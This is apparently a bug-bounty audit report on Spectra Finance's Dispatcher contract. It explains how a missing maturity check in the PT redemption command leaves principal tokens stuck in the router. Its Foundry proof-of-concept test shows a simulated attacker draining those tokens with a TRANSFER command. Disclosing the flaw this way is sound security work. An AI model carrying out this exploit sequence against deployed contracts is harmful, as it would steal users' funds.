# #44064 \[SC-Medium] Dispatcher incorrect validation causes principal tokens to be stuck in inheriting contract allowing attacker to steal user funds

**Submitted on Apr 16th 2025 at 14:58:45 UTC by @io10 for** [**Audit Comp | Spectra Finance**](https://immunefi.com/audit-competition/audit-comp-spectra-finance)

* **Report ID:** #44064
* **Report Type:** Smart Contract
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/Spectra-Audit-Competition/blob/main/src/router/Dispatcher.sol>
* **Impacts:**
  * Permanent freezing of unclaimed yield
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The Dispatcher::\_dispatch function in Spectra is responsible for routing user commands to various protocol operations, such as transfers, redemptions, and pool interactions. A bug in the REDEEM\_PT\_FOR\_ASSET command causes the dispatcher to incorrectly prevent PT redemptions if the contract lacks a balance of YT — even after maturity, when YT is no longer required. This causes user funds to become stuck or misrouted, leading to potential loss or theft.

## Vulnerability Details

Dispatcher::\_dispatch is a command that allows any user to execute certain commands that relate to token transfers, pool creation and interactions with pt, ibt and yt tokens. Contracts can inherit the functionality of the dispatcher to allow function routing to allowed contracts.

The vulnerability in Dispatcher::\_dispatch is in the following code block:

```solidity
else if (command == Commands.REDEEM_PT_FOR_ASSET) {
            (address pt, uint256 shares, address recipient, uint256 minAssets) = abi.decode(
                _inputs,
                (address, uint256, address, uint256)
            ); 
            shares = _resolveTokenValue(pt, shares);
            shares = Math.min(shares, IERC20(IPrincipalToken(pt).getYT()).balanceOf(address(this))); 
            recipient = _resolveAddress(recipient);
            IPrincipalToken(pt).redeem(shares, recipient, address(this), minAssets);
```

PrincipalToken::redeem works as follows:

```solidity
 /** @dev See {IPrincipalToken-redeem}. */
    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) public override nonReentrant returns (uint256 assets) {
        _beforeRedeem(shares, owner);
        emit Redeem(owner, receiver, shares);
        assets = IERC4626(ibt).redeem(_convertSharesToIBTs(shares, false), receiver, address(this));
    }

    /**
     * @dev Internal function for preparing redeem and burning PT:YT shares.
     * @param _shares The amount of shares being redeemed
     * @param _owner The address of shares' owner
     */
    function _beforeRedeem(uint256 _shares, address _owner) internal {
        if (_owner != msg.sender) {
            _spendAllowance(_owner, msg.sender, _shares);
        }
        if (_shares > _maxBurnable(_owner)) {
            revert InsufficientBalance();
        }
        if (block.timestamp >= expiry) {
            if (ratesAtExpiryStored == RAE_NOT_STORED) {
                storeRatesAtExpiry();
            }
        } else {
            updateYield(_owner);
            IYieldToken(yt).burnWithoutYieldUpdate(_owner, msg.sender, _shares);
        }
        _burn(_owner, _shares);
    }

```

\_beforeRedeem performs some checks before allowing a user redeem assets for pt. These checks include checking if the principal token is at or past maturity, in this case, it only updates the rates at expiry. If maturity hasnt been reached, then the user is required to burn an equivalent amount of yt tokens to redeem their assets. This is consistent with the natspec at the start of the principal token which says:

" The shares of the vaults are composed by PT/YT pairs. These are always minted at same times and amounts upon deposits.Until expiry burning shares necessitates to burn both tokens. At expiry, burning PTs is sufficient. This check is making sure that the contract has enough yt to redeem the shares which is not necessary for pt's redemption at expiry" .

Dispatcher::\_dispatch in the code block above, does not check if the principal token is at maturity or not and simply allocates shares based on how much yt the user has sent to the contract. As a result, users who have sold/transferred their yt's will not be able to redeem pt via the dispatcher as it will always calculate the amount of shares to redeem as 0. Any user who attempts to redeem PT for asset via the dispatcher will have their principal tokens stuck in the contract which allows an attacker to steal the user's principal tokens by calling the transfer command via the dispatcher.

## Impact Details

This vulnerability creates a situation where any user attempting to redeem PT for assets via the dispatcher will be blocked from redeeming if they no longer hold the corresponding YT tokens — even if the PT has reached maturity. This occurs because the dispatcher limits the redeemable share amount to the contract's balance of YT, which is only necessary pre-maturity. After maturity, the PT can be redeemed independently.

As a result, users can mistakenly transfer their PTs to the dispatcher and trigger a redeem operation, expecting to receive underlying assets. Instead, the dispatcher will attempt to redeem 0 shares (based on the YT balance check), and the user will receive nothing, while their PTs remain stuck in the dispatcher.

Consequences: Funds Stuck (Denial of Redemption): Users' PT tokens become irretrievable if they mistakenly redeem via the dispatcher post-maturity, leading to permanent loss of access to their principal assets.

Theft via Malicious Redemption: An attacker can monitor for such stuck PTs and, by using a subsequent dispatcher TRANSFER\_ERC20 command, redirect those PTs to themselves or front-run users to steal trapped PTs.

Loss of User Funds: This could result in significant monetary loss, especially for high-value deposits at maturity.

## Proof of Concept

## Proof of Concept

This test was run in Router.t.sol using the router as the child contract for the dispatcher to display the vulnerability

```solidity
function testRedeemPTForAsset() public { //c for testing purposes
        uint256 amount = 3e18;
       

        //c approve principaltoken contract to take ibt tokens
        ibt.approve(address(principalToken), amount);

        //c deposit ibt into pt contract
        principalToken.depositIBT(amount, testUser);

        //c get maturity 
        uint256 maturity = principalToken.maturity();
        //c wait for maturity
        vm.warp(maturity + 100);
        vm.roll(block.number + 1);

        //c give allowance to router to take pt tokens
        principalToken.approve(address(router), amount);
        
        //c attempt to use router to redeem pt for asset
        bytes memory commands = abi.encodePacked(
            bytes1(uint8(Commands.TRANSFER_FROM)),
            bytes1(uint8(Commands.REDEEM_PT_FOR_ASSET))
        );
        bytes[] memory inputs = new bytes[](2);
        inputs[0] = abi.encode(address(principalToken), amount);
        inputs[1] = abi.encode(address(principalToken), amount, testUser, 0);
        

        uint256 underlyingBalanceOfUserBefore = underlying.balanceOf(testUser);
        uint256 underlyingBalanceOfRouterBefore = underlying.balanceOf(address(router));
        uint256 underlyingBalanceOfOtherBefore = underlying.balanceOf(other);
        uint256 ptBalanceOfUserBefore = principalToken.balanceOf(testUser);
        uint256 ptBalanceOfRouterBefore = principalToken.balanceOf(address(router));
        uint256 ptBalanceOfOtherBefore = principalToken.balanceOf(other);

        router.execute(commands, inputs);

        /*assertEq(
            underlying.balanceOf(testUser),
            underlyingBalanceOfUserBefore,
            "User's underlying balance after router execution is wrong"
        );
        assertEq(
            underlying.balanceOf(address(router)),
            underlyingBalanceOfRouterBefore,
            "Router's underlying balance after router execution is wrong"
        );
        assertEq(
            principalToken.balanceOf(testUser),
            ptBalanceOfUserBefore,
            "User's PT balance after router execution is wrong"
        );
        assertEq(
            principalToken.balanceOf(address(router)),
            ptBalanceOfRouterBefore,
            "Router's PT balance after router execution is wrong"
        ); */

        //c with the pt's now stuck in the router, anyone can call transfer and get the pt's
        address attacker = vm.addr(100);
        vm.startPrank(attacker);
        bytes[] memory inputs1 = new bytes[](1);
        bytes memory commands1 = abi.encodePacked(
            bytes1(uint8(Commands.TRANSFER))
        );
        inputs1[0] = abi.encode(address(principalToken), attacker, amount);
        router.execute(commands1, inputs1);
        vm.stopPrank();

        assertEq(principalToken.balanceOf(attacker), amount);
            
    }
```

To see, that 0 underlying asset were transferred to testUser and the user's principal tokens are still in the router contract, uncomment the assert statements
